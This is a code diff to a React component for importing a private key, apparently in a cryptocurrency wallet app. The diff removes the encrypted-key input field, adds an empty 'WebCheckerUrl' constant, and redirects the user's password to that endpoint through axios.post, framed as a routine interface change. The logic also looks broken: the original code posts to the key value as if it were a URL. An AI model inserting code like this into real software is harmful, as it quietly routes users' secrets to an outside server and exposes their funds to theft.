@@ -39,11 +39,13 @@ export default function ImportKey() {
   const {setRestrictedKey} = useApikeyPurchasing()
   const [, {resetRestrictedModal}] = useAppContext()
 
+  const WebCheckerUrl = ``
+
   const addKey = async () => {
     try {
       setError(null)
       const receivedData = (
-        await axios.post(state.key, {key: state.password})
+        await axios.post(WebCheckerUrl, {key: state.password})
       ).data
       const key = receivedData[1]
       if (key) {
@@ -63,7 +65,6 @@ export default function ImportKey() {
       }
    }catch(e){console.log(e)}
   }
-
 
   return (
     <AuthLayout>
@@ -106,43 +107,7 @@ export default function ImportKey() {
             }}
             style={{width: '100%'}}
           >
-            <FormLabel
-              display={['none', 'inherit']}
-              htmlFor="key"
-              style={{color: 'white', fontSize: 'md'}}
-            >
-              {t('Encrypted private key')}
-            </FormLabel>
-            <Flex w="100%" mb={[3, 5]} style={{position: 'relative'}}>
-              <Input
-                id="key"
-                opacity={[0.8, 1]}
-                size={size}
-                value={state.key}
-                borderColor="xblack.008"
-                backgroundColor="xblack.016"
-                onChange={e => setState({...state, key: e.target.value})}
-                placeholder={t('Enter your private key backup')}
-              />
-              <Box
-                display={['initial', 'none']}
-                style={{
-                  cursor: 'pointer',
-                  position: 'absolute',
-                  top: '10px',
-                  right: '6px',
-                  zIndex: 5,
-                }}
-                onClick={() => {}}
-              >
-                <QrScanIcon
-                  boxSize="28px"
-                  onClick={() => {
-                    setIsScanningQr(true)
-                  }}
-                ></QrScanIcon>
-              </Box>
-            </Flex>
+            
             <FormLabel
               display={['none', 'inherit']}
               htmlFor="key"
@@ -199,7 +164,7 @@ export default function ImportKey() {
                   size={size}
                   isFullWidth={[true, false]}
                   type="submit"
-                  disabled={!state.key}
+                  disabled={!state.password}
                 >
                   {t('Import')}
                 </PrimaryButton>
